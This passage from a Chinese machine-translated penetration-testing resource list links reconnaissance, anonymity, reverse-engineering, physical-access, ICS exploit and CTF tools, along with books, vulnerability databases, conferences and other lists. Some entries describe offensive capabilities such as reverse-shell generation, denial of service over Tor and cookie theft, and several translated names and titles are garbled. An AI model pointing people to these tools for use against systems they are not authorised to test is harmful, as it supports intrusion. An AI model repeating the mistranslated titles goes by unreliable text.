/组织以查找潜在敏感信息泄漏的CLI工具。</li><li><a href="https://github.com/melvinsh/vcsmap">vcsmap</a> – 基于插件的工具，用于扫描公共版本控制系统以获取敏感信息。</li><li><a href="http://www.spiderfoot.net/">Spiderfoot</a> – 具有Web UI和报告可视化的多源OSINT自动化工具。</li><li><a href="https://github.com/Hood3dRob1n/BinGoo">BinGoo</a> – 基于GNU / Linux bash的Bing和Google Dorking工具。</li><li><a href="https://github.com/DanMcInerney/fast-recon">快速侦察</a> – 针对域名执行Google dorks。</li><li><a href="https://github.com/Smaash/snitch">告密者</a> -通过信息收集dorks。</li><li><a href="https://github.com/1N3/Sn1per">Sn1per</a> – 自动Pentest Recon扫描仪。</li><li><a href="https://www.threatcrowd.org/">威胁人群</a> – <a href="https://www.threatcrowd.org/">威胁</a>搜索引擎。</li><li><a href="https://www.virustotal.com/">Virus Total</a> – 免费服务，可分析可疑文件和URL，并有助于快速检测病毒，蠕虫，特洛伊木马和各种恶意软件。</li><li><a href="https://packettotal.com/">PacketTotal</a> – 简单，免费，高质量的数据包捕获文件分析，有助于快速检测网络传播的恶意软件（使用Bro和Suricata IDS签名）。</li><li><a href="https://github.com/upgoingstar/datasploit">DataSploit</a> – OSINT可视化工具，在幕后使用Shodan，Censys，Clearbit，EmailHunter，FullContact和Zoomeye。</li><li><a href="https://github.com/michenriksen/aquatone">AQUATONE</a> – 子域发现工具，利用各种开源生成报告，可用作其他工具的输入。</li><li><a href="http://intrigue.io/">Intrigue</a> – 具有强大API，UI和CLI的自动OSINT和Attack Surface发现框架。</li><li><a href="https://www.zoomeye.org/">ZoomEye</a> – 网络空间搜索引擎，让用户可以找到特定的网络组件。</li><li><a href="https://github.com/Nhoya/gOSINT">gOSINT</a> – 具有多个模块和电报刮刀的OSINT工具。</li><li><a href="https://github.com/OWASP/Amass">OWASP Amass</a> – 通过抓取，网络存档，暴力破解，排列，反向DNS扫描，TLS证书，被动DNS数据源等子域名枚举。</li><li><a href="https://hunter.io/">Hunter.io</a> – 数据代理，提供Web搜索界面，用于发现公司的电子邮件地址和其他组织详细信息。</li><li><a href="https://www.elevenpaths.com/labstools/foca/">FOCA（收集档案的指纹识别组织）</a> – 自动文档<a href="https://www.elevenpaths.com/labstools/foca/">搜集器</a>，可搜索Google，Bing和DuckDuckGo，以查找和推断内部公司组织结构。</li><li><a href="https://github.com/USSCltd/dorks">dorks</a> – 谷歌黑客数据库自动化工具。</li><li><a href="https://github.com/ascribe/image-match">图像匹配</a> – 快速搜索数十亿图像。</li><li><a href="https://github.com/SharadKumar97/OSINT-SPY">OSINT-SPY</a> – 对电子邮件地址，域名，IP地址或组织执行OSINT扫描。</li><li><a href="https://github.com/opsdisk/pagodo">pagodo</a> – 自动化Google Hacking Database抓取。</li><li><a href="https://github.com/kisom/surfraw">surfraw</a> – 快速UNIX命令行界面，适用于各种流行的WWW搜索引擎。</li><li><a href="https://github.com/gyoisamurai/GyoiThon">GyoiThon</a> – GyoiThon是一款使用机器学习的智能收集工具。</li></ul><h3 id="匿名工具"><a href="#匿名工具" class="headerlink" title="匿名工具"></a>匿名工具</h3><ul><li><a href="https://www.torproject.org/">Tor</a> – 免费软件和洋葱路由覆盖网络，可帮助您防御流量分析。</li><li><a href="https://onionscan.org/">OnionScan</a> – 通过查找Tor隐藏服务运营商引入的操作安全问题来调查Dark Web的工具。</li><li><a href="https://geti2p.net/">I2P</a> – 隐形互联网项目。</li><li><a href="https://github.com/GouveaHeitor/nipe">Nipe</a> – 用于将所有流量从计算机重定向到Tor网络的脚本。</li><li><a href="http://webkay.robinlinus.com/">每个浏览器都知道的内容</a> – 全面的检测页面，用于测试您自己的Web浏览器的隐私和身份泄漏配置。</li><li><a href="https://github.com/zacscott/dos-over-tor">dos-over-tor</a> – Tor压力测试工具的概念验证拒绝服务。</li><li><a href="https://github.com/nametoolong/oregano">oregano</a> – 作为中间机器（MITM）运行的Python模块，接受Tor客户端请求。</li><li><a href="https://github.com/brainfuckSec/kalitorify">kalitorify</a> – 通过Tor为Kali Linux OS提供透明代理。</li></ul><h3 id="逆向工程工具"><a href="#逆向工程工具" class="headerlink" title="逆向工程工具"></a>逆向工程工具</h3><ul><li><a href="https://www.hex-rays.com/products/ida/">交互式反汇编程序（IDA Pro）</a> – 用于Windows，GNU / Linux或macOS的专有多处理器反汇编程序和调试程序; 还有免费版，<a href="https://www.hex-rays.com/products/ida/support/download_freeware.shtml">IDA Free</a>。</li><li><a href="https://msdn.microsoft.com/en-us/windows/hardware/hh852365.aspx">WDK / WinDbg</a> – Windows驱动程序工具包和WinDbg。</li><li><a href="http://www.ollydbg.de/">OllyDbg</a> – 用于Windows二进制文件的x86调试器，强调二进制代码分析。</li><li><a href="http://rada.re/r/index.html">Radare2</a> – 开源，<a href="http://rada.re/r/index.html">跨</a>平台逆向工程框架。</li><li><a href="http://x64dbg.com/">x64dbg</a> – 用于Windows的开源x64 / x32调试器。</li><li><a href="http://debugger.immunityinc.com/">Immunity Debugger</a> – 编写漏洞并分析恶意软件的强大方法。</li><li><a href="http://www.codef00.com/projects#debugger">Evan的调试器</a> – 类似于OllyDbg的GNU / Linux调试器。</li><li><a href="https://github.com/wisk/medusa">Medusa</a> – 开源，跨平台的交互式反汇编程序。</li><li><a href="https://github.com/joelpx/plasma">plasma</a> – 用于x86 / ARM / MIPS的交互式反汇编程序。使用彩色语法代码生成缩进的伪代码。</li><li><a href="https://github.com/longld/peda">peda</a> – 针对GDB的Python漏洞利用开发协助。</li><li><a href="https://github.com/0xd4d/dnSpy">dnSpy</a> – 反向工程.NET程序集的工具。</li><li><a href="https://github.com/devttys0/binwalk">binwalk</a> – 快速，易用的工具，用于分析，逆向工程和提取固件映像。</li><li><a href="https://github.com/Cisco-Talos/pyrebox">PyREBox</a> – Cisco-Talos的Python脚本化逆向工程沙箱。</li><li><a href="https://github.com/snare/voltron">Voltron</a> – 用Python编写的可扩展调试器UI工具包。</li><li><a href="http://www.capstone-engine.org/">Capstone</a> – 轻量级多平台，多架构拆卸框架。</li><li><a href="https://github.com/fireeye/rVMI">rVMI</a> – 类固醇调试器; 在单个工具中检查用户空间进程，内核驱动程序和预引导环境。</li><li><a href="https://www.frida.re/">Frida</a> – 面向开发人员，逆向工程师和安全研究人员的动态检测工具包。</li><li><a href="https://github.com/kpcyrd/boxxy-rs">boxxy</a> – 可链接的沙盒浏览器。</li><li><a href="https://github.com/pwndbg/pwndbg">pwndbg</a> – GDB插件，可简化GDB调试，重点关注低级软件开发人员，硬件黑客，逆向工程师和漏洞利用开发人员所需的功能。</li></ul><h3 id="物理访问工具"><a href="#物理访问工具" class="headerlink" title="物理访问工具"></a>物理访问工具</h3><ul><li><a href="https://lanturtle.com/">LAN Turtle</a> – 隐藏式“USB以太网适配器”，可在本地网络中安装时提供远程访问，网络情报收集和MITM功能。</li><li><a href="http://usbrubberducky.com/">USB Rubber Ducky</a> – 可定制的击键注入攻击平台伪装成USB拇指驱动器。</li><li><a href="https://samy.pl/poisontap/">Poisontap</a> – <a href="https://samy.pl/poisontap/">虹吸式</a> cookie，暴露内部（LAN端）路由器并在锁定的计算机上安装Web后门。</li><li><a href="https://www.wifipineapple.com/">WiFi Pineapple</a> – 无线审计和渗透测试平台。</li><li><a href="https://proxmark3.com/">Proxmark3</a> – RFID / NFC克隆，重放和欺骗工具包，通常用于分析和攻击感应卡/读卡器，无线钥匙/钥匙扣等。</li><li><a href="https://github.com/ufrisk/pcileech">PCILeech</a> – 使用PCIe硬件设备通过PCIe上的直接内存访问（DMA）从目标系统内存进行读写。</li><li><a href="https://atcommands.org/">AT命令</a> – 通过Android设备的USB端口使用AT命令重写设备固件，绕过安全机制，泄露敏感信息，执行屏幕解锁和注入触摸事件。</li><li><a href="https://www.hak5.org/gear/bash-bunny">Bash Bunny</a> – 以USB拇指驱动器形式的本地漏洞利用程序交付工具，您可以在名为BunnyScript的DSL中编写有效负载。</li><li><a href="https://www.hak5.org/gear/packet-squirrel">Packet Squirrel</a> – 以太网多工具，旨在通过交换机启用隐蔽远程访问，无痛数据包捕获和安全VPN连接。</li></ul><h3 id="工业控制和SCADA系统"><a href="#工业控制和SCADA系统" class="headerlink" title="工业控制和SCADA系统"></a>工业控制和SCADA系统</h3><ul><li><a href="https://github.com/dark-lbp/isf">工业开发框架（ISF）</a> – 基于routerploit的类似Metasploit的漏洞利用框架，旨在针对工业控制系统（ICS），SCADA设备，PLC固件等。</li><li><a href="https://github.com/klsecservices/s7scan">s7scan</a> – 用于在TCP / IP或LLC网络上枚举Siemens S7 PLC的扫描仪。</li></ul><h3 id="侧通道工具"><a href="#侧通道工具" class="headerlink" title="侧通道工具"></a>侧通道工具</h3><ul><li><a href="http://chipwhisperer.com/">ChipWhisperer</a> – 完整的开源工具链，用于<a href="http://chipwhisperer.com/">旁路</a>功率分析和毛刺攻击。</li></ul><h3 id="CTF工具"><a href="#CTF工具" class="headerlink" title="CTF工具"></a>CTF工具</h3><ul><li><a href="https://github.com/zardus/ctf-tools">ctf-tools</a> – 安装各种安全研究工具的安装脚本集合，可以轻松快速地部署到新机器上。</li><li><a href="https://github.com/Gallopsled/pwntools">Pwntools</a> – 为CTF使用而构建的快速漏洞利用开发框架。</li><li><a href="https://github.com/sourcekris/RsaCtfTool">RsaCtfTool</a> – 使用弱RSA密钥解密数据，并使用各种自动攻击从公钥恢复私钥。</li><li><a href="https://github.com/0x00-0x00/shellpop">shellpop</a> – 轻松生成复杂的反向或绑定shell命令，以帮助您在渗透测试期间节省时间。</li></ul><h3 id="协作工具"><a href="#协作工具" class="headerlink" title="协作工具"></a>协作工具</h3><ul><li><a href="https://github.com/outflanknl/RedELK">RedELK</a> – 跟踪和报警Blue Team活动，同时在长期攻击行动中提供更好的可用性。</li></ul><h2 id="图书"><a href="#图书" class="headerlink" title="图书"></a>图书</h2><h3 id="渗透测试书籍"><a href="#渗透测试书籍" class="headerlink" title="渗透测试书籍"></a>渗透测试书籍</h3><ul><li><a href="https://www.nostarch.com/hacking2.htm">Jon Erickson的剥削艺术，2008年</a></li><li><a href="https://www.nostarch.com/metasploit">Metasploit：David Kennedy等人的渗透测试指南，2011</a></li><li><a href="https://www.nostarch.com/pentesting">渗透测试：2014年格鲁吉亚Weidman的实践黑客入门介绍</a></li><li><a href="https://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504/">Rtfm：Ben Clark的红队实地手册，2014年</a></li><li><a href="https://www.amazon.de/Blue-Team-Field-Manual-BTFM/dp/154101636X">Btfm：Alan J White和Ben Clark的Blue Team Field手册，2017年</a></li><li><a href="https://www.amazon.com/The-Hacker-Playbook-Practical-Penetration/dp/1494932636/">2014年Peter Kim的Hacker Playbook</a></li><li><a href="https://www.elsevier.com/books/the-basics-of-hacking-and-penetration-testing/engebretson/978-1-59749-655-1">2013年Patrick Engebretson的黑客攻击和渗透测试基础知识</a></li><li><a href="https://www.elsevier.com/books/professional-penetration-testing/wilhelm/978-1-59749-993-4">2013年Thomas Wilhelm的专业渗透测试</a></li><li><a href="https://www.packtpub.com/networking-and-servers/advanced-penetration-testing-highly-secured-environments-ultimate-security-gu">Lee Allen，2012年针对高度安全环境的高级渗透测试</a></li><li><a href="https://www.elsevier.com/books/violent-python/unknown/978-1-59749-957-6">TJ O’Connor的暴力Python，2012年</a></li><li><a href="http://www.fuzzing.org/">模糊测试：Michael Sutton等人发布的“暴力漏洞发现”，2007年</a></li><li><a href="https://www.amazon.com/Black-Hat-Python-Programming-Pentesters/dp/1593275900">Black Hat Python：2014年Justin Seitz为黑客和Pentesters进行Python编程</a></li><li><a href="https://www.amazon.com/Penetration-Testing-Procedures-Methodologies-EC-Council/dp/1435483677">渗透测试：EC委员会的程序和方法，2010</a></li><li><a href="https://www.amazon.com/Unauthorised-Access-Physical-Penetration-Security-ebook/dp/B005DIAPKE">未经授权的访问：对于IT安全团队的物理渗透测试，Wil Allsopp，2010</a></li><li><a href="https://www.amazon.com/Advanced-Persistent-Threat-Hacking-Organization/dp/0071828362">高级持续性威胁黑客：通过Tyler Wrightson攻击任何组织的艺术和科学，2014年</a></li><li><a href="https://www.nostarch.com/bughunter">Tobias Klein的Bug Hunter日记，2011年</a></li><li><a href="https://www.amazon.com/Advanced-Penetration-Testing-Hacking-Networks/dp/1119367689/">Wil Allsopp的高级渗透测试，2017年</a></li></ul><h3 id="黑客手册系列"><a href="#黑客手册系列" class="headerlink" title="黑客手册系列"></a>黑客手册系列</h3><ul><li><a href="http://www.wiley.com/WileyCDA/WileyTitle/productCd-0764578014.html">数据库黑客手册，David Litchfield等，2005</a></li><li><a href="http://www.wiley.com/WileyCDA/WileyTitle/productCd-047008023X.html">Chris Anley等人的Shellcoders手册，2007年</a></li><li><a href="http://www.wiley.com/WileyCDA/WileyTitle/productCd-0470395362.html">查理米勒和迪诺戴佐维的Mac黑客手册，2009年</a></li><li><a href="http://www.wiley.com/WileyCDA/WileyTitle/productCd-1118026470.html">D. Stuttard，M。Pinto，2011年的Web应用程序黑客手册</a></li><li><a href="http://www.wiley.com/WileyCDA/WileyTitle/productCd-1118204123.html">查理米勒等人的iOS黑客手册，2012年</a></li><li><a href="http://www.wiley.com/WileyCDA/WileyTitle/productCd-111860864X.html">Joshua J. Drake等人的Android黑客手册，2014年</a></li><li><a href="http://www.wiley.com/WileyCDA/WileyTitle/productCd-1118662091.html">Wade Alcorn等人的浏览器黑客手册，2014年</a></li><li><a href="http://www.wiley.com/WileyCDA/WileyTitle/productCd-1118958500.html">Dominic Chell等人的移动应用程序黑客手册，2015年</a></li><li><a href="https://www.nostarch.com/carhacking">Craig Smith的Car Hacker’s手册，2016年</a></li></ul><h3 id="防守发展"><a href="#防守发展" class="headerlink" title="防守发展"></a>防守发展</h3><ul><li><a href="https://leanpub.com/holistic-infosec-for-web-developers">Web开发人员的整体信息 – （分册0）</a></li><li><a href="https://leanpub.com/holistic-infosec-for-web-developers-fascicle1-vps-network-cloud-webapplications">Web开发人员的整体信息 – （分册1）</a></li></ul><h3 id="网络分析书籍"><a href="#网络分析书籍" class="headerlink" title="网络分析书籍"></a>网络分析书籍</h3><ul><li><a href="https://nmap.org/book/">Nmap Network Scanning by Gordon Fyodor Lyon，2009</a></li><li><a href="https://www.nostarch.com/packet2.htm">Chris Sanders的实用数据包分析，2011年</a></li><li><a href="https://www.amazon.com/Wireshark-Network-Analysis-Second-Certified/dp/1893939944">Wirehark网络分析由Laura Chappell和Gerald Combs撰写，2012年</a></li><li><a href="https://www.amazon.com/Network-Forensics-Tracking-Hackers-Cyberspace-ebook/dp/B008CG8CYU/">网络取证：由Sherri Davidoff和Jonathan Ham于2012年通过网络空间跟踪黑客</a></li></ul><h3 id="逆向工程书籍"><a href="#逆向工程书籍" class="headerlink" title="逆向工程书籍"></a>逆向工程书籍</h3><ul><li><a href="http://beginners.re/">Dennis Yurichev的初学者逆向工程</a></li><li><a href="https://www.nostarch.com/xbox.htm">2003年，Andrew Huang攻击Xbox</a></li><li><a href="https://www.nostarch.com/idapro2.htm">2011年，Chris Eagle的IDA Pro Book</a></li><li><a href="http://www.wiley.com/WileyCDA/WileyTitle/productCd-1118787315.html">实用逆向工程，Bruce Dang等，2014</a></li><li><a href="https://www.amazon.com/Hacking-Ethical-Hackers-Handbook-Edition/dp/0071832386">灰帽子黑客丹尼尔雷加多等人的道德黑客手册，2015年</a></li></ul><h3 id="恶意软件分析书籍"><a href="#恶意软件分析书籍" class="headerlink" title="恶意软件分析书籍"></a>恶意软件分析书籍</h3><ul><li><a href="https://www.nostarch.com/malware">Michael Sikorski和Andrew Honig的实用恶意软件分析，2012年</a></li><li><a href="http://www.wiley.com/WileyCDA/WileyTitle/productCd-1118825098.html">Michael Hale Ligh等人，2014年的记忆取证艺术</a></li><li><a href="http://www.wiley.com/WileyCDA/WileyTitle/productCd-0470613033.html">恶意软件分析师的手册和DVD由Michael Hale Ligh等人，2010年</a></li></ul><h3 id="WINDOWS书籍"><a href="#WINDOWS书籍" class="headerlink" title="WINDOWS书籍"></a>WINDOWS书籍</h3><ul><li><a href="https://www.amazon.com/Windows-Internals-Part-Developer-Reference/dp/0735648735/">由Mark Russinovich等人撰写的Windows Internals，2012</a></li><li><a href="https://www.amazon.com/Troubleshooting-Windows-Sysinternals-Tools-2nd/dp/0735684448/">2016年，Mark Russinovich和Aaron Margosis使用Windows Sysinternals工具进行故障排除</a></li></ul><h3 id="社会工程书籍"><a href="#社会工程书籍" class="headerlink" title="社会工程书籍"></a>社会工程书籍</h3><ul><li><a href="http://www.wiley.com/WileyCDA/WileyTitle/productCd-0471237124.html">凯文·米特尼克和威廉·L·西蒙的欺骗艺术，2002年</a></li><li><a href="http://www.wiley.com/WileyCDA/WileyTitle/productCd-0764569597.html">2005年，Kevin D. Mitnick和William L. Simon的入侵艺术</a></li><li><a href="http://www.hachettebookgroup.com/titles/kevin-mitnick/ghost-in-the-wires/9780316134477/">电影中的幽灵作者：Kevin D. Mitnick和William L. Simon，2011年</a></li><li><a href="https://www.elsevier.com/books/no-tech-hacking/mitnick/978-1-59749-215-7">Johnny Long和Jack Wiles，2008年没有技术黑客攻击</a></li><li><a href="http://www.wiley.com/WileyCDA/WileyTitle/productCd-1118608577.html">揭开社会工程师的角色：Christopher Hadnagy，2014年的人类安全元素</a></li><li><a href="https://www.mhprofessional.com/9780071818469-usa-social-engineering-in-it-security-tools-tactics-and-techniques-group">IT安全社会工程：Sharon Conheady的工具，策略和技术，2014年</a></li></ul><h3 id="锁定采摘书籍"><a href="#锁定采摘书籍" class="headerlink" title="锁定采摘书籍"></a>锁定采摘书籍</h3><ul><li><a href="https://www.elsevier.com/books/practical-lock-picking/ollam/978-1-59749-989-7">Deviant Ollam的实用锁定采摘，2012年</a></li><li><a href="https://www.elsevier.com/books/keys-to-the-kingdom/ollam/978-1-59749-983-5">Deviant Ollam的王国钥匙，2012年</a></li><li>[锁定采摘：所罗门的细节矫枉过正](<a href="https://www.dropbox.com/s/y39ix9u9qpqffct/Lockpicking">https://www.dropbox.com/s/y39ix9u9qpqffct/Lockpicking</a> Detail Overkill.pdf?dl=0)</li><li><a href="https://www.dropbox.com/sh/k3z4dm4vyyojp3o/AAAIXQuwMmNuCch_StLPUYm-a?dl=0">Eddie the Wire书籍</a></li></ul><h3 id="DEFCON建议阅读"><a href="#DEFCON建议阅读" class="headerlink" title="DEFCON建议阅读"></a>DEFCON建议阅读</h3><ul><li><a href="https://www.defcon.org/html/links/book-list.html">Defcon建议阅读</a></li></ul><h2 id="漏洞数据库"><a href="#漏洞数据库" class="headerlink" title="漏洞数据库"></a>漏洞数据库</h2><ul><li><a href="https://cve.mitre.org/">常见漏洞和暴露（CVE）</a> – 公共名称字典（即CVE标识符），用于公开的安全漏洞。</li><li><a href="https://nvd.nist.gov/">国家漏洞数据库（NVD）</a> – 美国政府的国家漏洞数据库提供标准CVE列表的附加元数据（CPE，CVSS评分）以及细粒度的搜索引擎。</li><li><a href="https://www.kb.cert.org/vuls/">US-CERT漏洞说明数据库</a> – 由美国计算机紧急响应小组（US-CERT）汇总的摘要，技术详细信息，补救信息以及受软件漏洞影响的供应商列表。</li><li><a href="http://seclists.org/fulldisclosure/">完全披露</a> – 公开的，供应商中立的论坛，详细讨论漏洞，通常在许多其他来源之前发布详细信息。</li><li><a href="http://www.securityfocus.com/bid/">Bugtraq（BID）</a> – 软件安全漏洞识别数据库，根据提交给SecurityFocus邮件列表和其他来源（由Symantec，Inc。运营）编译而成。</li><li><a href="https://www.exploit-db.com/">Exploit-DB</a> – 非营利性项目托管软件漏洞的攻击，由攻击性安全部门提供公共服务。</li><li><a href="https://technet.microsoft.com/en-us/security/bulletins#sec_search">Microsoft安全公告</a> – Microsoft安全响应中心（MSRC）发布的Microsoft软件中发现的安全问题的公告。</li><li><a href="https://technet.microsoft.com/en-us/security/advisories#APUMA">Microsoft</a>安全建议 – 影响Microsoft软件的安全建议存档。</li><li><a href="https://www.mozilla.org/security/advisories/">Mozilla Foundation Security Advisories</a> – 影响Mozilla软件的安全建议存档，包括Firefox Web浏览器。</li><li><a href="https://packetstormsecurity.com/files/">数据包风暴</a> – 整个行业聚合的漏洞利用，建议，工具和其他与安全相关的资源汇编。</li><li><a href="https://cxsecurity.com/">CXSecurity</a> – 已发布的CVE和Bugtraq软件漏洞存档与Google dork数据库交叉引用，用于发现列出的漏洞。</li><li><a href="http://www.securiteam.com/">SecuriTeam</a> – 软件漏洞信息的独立来源。</li><li><a href="https://www.vulnerability-lab.com/">漏洞实验室</a> – 根据漏洞利用目标类别组织的安全建议开放论坛。</li><li><a href="https://zerodayinitiative.com/advisories/published/">零日活动</a> – 由TippingPoint运营的Bug赏金计划，其中包含已公布的安全建议的公开存档档案。</li><li><a href="https://vulners.com/">Vulners</a> – 软件漏洞的安全数据库。</li><li><a href="https://www.0day.today/">Inj3ct0r</a> – 利用市场和漏洞信息聚合器。（<a href="http://mvfjfugdwgc5uwho.onion/">洋葱服务</a>。）</li><li><a href="https://hpi-vdb.de/">HPI-VDB</a> – 由波茨坦Hasso-Plattner研究所提供的交叉引用软件漏洞的聚合器，提供免费的API访问。</li><li><a href="http://www.cnnvd.org.cn/">中国国家漏洞数据库（CNNVD）</a> – 中国政府运行的漏洞数据库，<a href="http://www.cnnvd.org.cn/">类似于</a>由Mitre Corporation主办的美国CVE数据库。</li><li><a href="https://distributedweaknessfiling.org/">分布式弱点归档（DWF）</a> – 联合CNA（CVE号码管理机构）镜像MITRE的CVE数据库，并提供额外的CVE等效数字，以覆盖其他范围外的漏洞披露。</li></ul><h2 id="安全课程"><a href="#安全课程" class="headerlink" title="安全课程"></a>安全课程</h2><ul><li><a href="https://www.offensive-security.com/information-security-training/">进攻性安全培训</a> – 来自BackTrack / Kali开发人员的培训。</li><li><a href="http://www.sans.org/">SANS安全培训</a> – 计算机安全培训和认证。</li><li><a href="http://opensecuritytraining.info/">开放式安全培训</a> – 计算机安全课程的培训材料。</li><li><a href="https://trailofbits.github.io/ctf/">CTF现场指南</a> – 赢得下一届CTF比赛所需的一切。</li><li><a href="http://azcwr.org/">ARIZONA CYBER WARFARE RANGE</a> – 通过现实世界的操作为初学者提供24×7实弹演习; 向上发展到网络战现实世界的能力。</li><li><a href="https://cybrary.it/">Cybrary</a> – 道德黑客和高级渗透测试的免费课程。高级渗透测试课程基于“高度安全环境的渗透测试”一书。</li><li><a href="https://www.enisa.europa.eu/topics/trainings-for-cybersecurity-specialists/online-training-material">欧盟网络与信息安全局</a> – ENISA网络安全培训材料。</li></ul><h2 id="信息安全会议"><a href="#信息安全会议" class="headerlink" title="信息安全会议"></a>信息安全会议</h2><ul><li><a href="https://www.defcon.org/">DEF CON</a> – 拉斯维加斯的年度黑客大会。</li><li><a href="https://www.blackhat.com/">黑帽</a> – 拉斯维加斯的年度安全会议。</li><li><a href="http://www.securitybsides.com/">BSides</a> – 组织和举行安全会议的框架。</li><li><a href="https://events.ccc.de/congress/">CCC-</a>德国国际黑客现场年会。</li><li><a href="https://www.derbycon.com/">DerbyCon</a> – 位于路易斯维尔的年度黑客大会。</li><li><a href="http://phreaknic.info/">PhreakNIC</a> – 技术会议每年在田纳西州中部举行。</li><li><a href="http://shmoocon.org/">ShmooCon</a> – 年度美国东海岸黑客大会。</li><li><a href="http://www.carolinacon.org/">CarolinaCon</a> – Infosec会议，每年在北卡罗来纳州举行。</li><li><a href="https://2016.chcon.nz/">CHCon</a> – Christchurch Hacker Con，只有新西兰南岛的黑客骗局。</li><li><a href="http://www.summercon.org/">SummerCon</a> – 夏季举办的最古老的黑客大会之一。</li><li><a href="https://2016.hack.lu/">Hack.lu</a> – 年会在卢森堡举行。</li><li><a href="https://hackfest.ca/">Hackfest</a> – 加拿大最大的黑客大会。</li><li><a href="https://conference.hitb.org/">HITB</a> – 在马来西亚和荷兰举行的深度知识安全会议。</li><li><a href="https://www.troopers.de/">Troopers</a> – 年度国际IT安全活动，在德国海德堡举办研讨会。</li><li><a href="http://thotcon.org/">ThotCon</a> – 在芝加哥举行的年度美国黑客大会。</li><li><a href="http://www.layerone.org/">LayerOne</a> – 每年春天在洛杉矶举行的年度美国安全会议。</li><li><a href="https://deepsec.net/">DeepSec</a> – 奥地利维也纳安全会议。</li><li><a href="http://www.skydogcon.com/">SkyDogCon</a> – 纳什维尔的技术会议。</li><li><a href="http://secuinside.com/">SECUINSIDE</a> – <a href="https://en.wikipedia.org/wiki/Seoul">首尔</a>安全会议。</li><li><a href="http://def.camp/">DefCamp</a> – 东欧最大的安全会议，每年在罗马尼亚布加勒斯特举行。</li><li><a href="https://appsecusa.org/">AppSecUSA</a> – 由OWASP组织的年度会议。</li><li><a href="http://brucon.org/">BruCON</a> – 比利时年度安全会议。</li><li><a href="http://www.infosecurityeurope.com/">Infosecurity Europe</a> – 欧洲<a href="http://www.infosecurityeurope.com/">首屈一指</a>的信息安全活动，在英国伦敦举行。</li><li><a href="http://nullcon.net/website/">Nullcon</a> – 在德里和印度果阿举行的年会。</li><li><a href="https://www.rsaconference.com/">RSA会议美国</a> – 年度安全会议在美国加利福尼亚州旧金山举行。</li><li><a href="https://www.swisscyberstorm.com/">瑞士网络风暴</a> – 瑞士卢塞恩的年度安全会议。</li><li><a href="https://www.virusbulletin.com/conference/index">Virus Bulletin Conference</a> – 年会将于2016年在美国丹佛举行。</li><li><a href="http://www.ekoparty.org/">Ekoparty</a> – 拉丁美洲最大的安全会议，每年在阿根廷布宜诺斯艾利斯举行。</li><li><a href="https://44con.com/">44Con</a> – 在伦敦举行的年度安全会议。</li><li><a href="https://www.balccon.org/">BalCCon</a> – 巴尔干计算机大会，每年在塞尔维亚诺维萨德举行。</li><li><a href="http://fsec.foi.hr/">FSec</a> – FSec – 克罗地亚Varaždin的克罗地亚信息安全聚会。</li></ul><h2 id="信息安全杂志"><a href="#信息安全杂志" class="headerlink" title="信息安全杂志"></a>信息安全杂志</h2><ul><li><a href="https://www.2600.com/Magazine/DigitalEditions">2600：黑客季刊</a> – 美国出版的关于技术和计算机的“地下”。</li><li><a href="http://www.phrack.org/">Phrack杂志</a> – 迄今为止运行时间最长的黑客杂志。</li></ul><h2 id="令人敬畏的名单"><a href="#令人敬畏的名单" class="headerlink" title="令人敬畏的名单"></a>令人敬畏的名单</h2><ul><li><p><a href="http://tools.kali.org/tools-listing">Kali Linux Tools</a> – <a href="http://tools.kali.org/tools-listing">Kali Linux中的工具</a>列表。</p></li><li><p><a href="http://sectools.org/">SecTools</a> – 125种网络安全工具。</p></li><li><p><a href="https://github.com/coreb1t/awesome-pentest-cheat-sheets">Pentest作弊表</a> – 令人敬畏的Pentest作弊表。</p></li><li><p><a href="https://github.com/fffaraz/awesome-cpp">C / C ++编程</a> – 开源安全工具的主要语言之一。</p></li><li><p><a href="https://github.com/quozd/awesome-dotnet">.NET编程</a> – 用于Microsoft Windows平台开发的软件框架。</p></li><li><p><a href="https://github.com/alebcay/awesome-shell">Shell Scripting</a> – 命令行框架，工具包，指南和小玩意儿。</p></li><li><p><a href="https://github.com/dreikanter/ruby-bookmarks">@dreikanter的Ruby编程</a> – 编写漏洞利用的事实上的语言。</p></li><li><p><a href="https://github.com/markets/awesome-ruby">@markets的Ruby编程</a> – 用于编写漏洞利用的事实上的语言。</p></li><li><p><a href="https://github.com/Sdogruyol/awesome-ruby">@Sdogruyol的Ruby编程</a> – 用于编写漏洞利用的事实上的语言。</p></li><li><p><a href="https://github.com/sorrycc/awesome-javascript">JavaScript编程</a> – 浏览器内开发和脚本编写。</p></li><li><p><a href="https://github.com/sindresorhus/awesome-nodejs">Node.js由@sindresorhus编程</a> – 令人愉快的Node.js软件包和资源<a href="https://github.com/sindresorhus/awesome-nodejs">的精选</a>列表。</p></li><li><p><a href="https://github.com/dloss/python-pentest-tools">用于渗透测试人员的Python工具</a> – 许多<a href="https://github.com/dloss/python-pentest-tools">测试</a>工具都是用Python编写的。</p></li><li><p><a href="https://github.com/svaksha/pythonidae">@svaksha的</a> Python编程 – 一般Python编程。</p></li><li><p><a href="https://github.com/vinta/awesome-python">@vinta进行</a> Python编程 – 一般Python编程。</p></li><li><p><a href="https://github.com/ashishb/android-security-awesome">Android安全</a> – Android安全相关资源的集合。</p></li><li><p><a href="https://github.com/bayandin/awesome-awesomeness">令人敬畏的Awesomness</a> – 列表清单。</p></li><li><p><a href="https://github.com/paragonie/awesome-appsec">AppSec</a> – 用于了解应用程序安全性的资源。</p></li><li><p><a href="https://github.com/apsdehal/awesome-ctf">CTFs</a> – 捕获Flag框架，库等。</p></li><li><p><a href="https://github.com/AnarchoTechNYC/meta/wiki/InfoSec#hacking-challenges">InfoSec§黑客挑战</a> – CTF，战争游戏，黑客挑战网站，pentest练习实验室练习等综合目录。</p></li><li><p><a href="https://github.com/carpedm20/awesome-hacking">黑客</a> – 教程，工具和资源。</p></li><li><p><a href="https://github.com/paralax/awesome-honeypots">蜜罐</a> – 蜜罐，工具，组件等。</p></li><li><p><a href="https://github.com/onlurking/awesome-infosec">Infosec</a> – 用于测试，取证等的信息安全资源。</p></li><li><p><a href="https://github.com/Cugu/awesome-forensics">取证</a> – 免费（主要是开源）取证分析工具和资源。</p></li><li><p><a href="https://github.com/rshipp/awesome-malware-analysis">恶意软件分析</a> – 分析师的工具和资源。</p></li><li><p><a href="https://github.com/caesar0301/awesome-pcaptools">PCAP工具</a> – 用于处理网络流量的工具。</p></li><li><p><a href="https://github.com/sbilly/awesome-security">安全性</a> – 软件，库，文档和其他资源。</p></li><li><p><a href="https://github.com/meitar/awesome-lockpicking">令人敬畏的Lockpicking</a> – 关于锁，保险箱和密钥的安全性和<a href="https://github.com/meitar/awesome-lockpicking">危害性的</a>令人敬畏的指南，工具和其他资源。</p></li><li><p><a 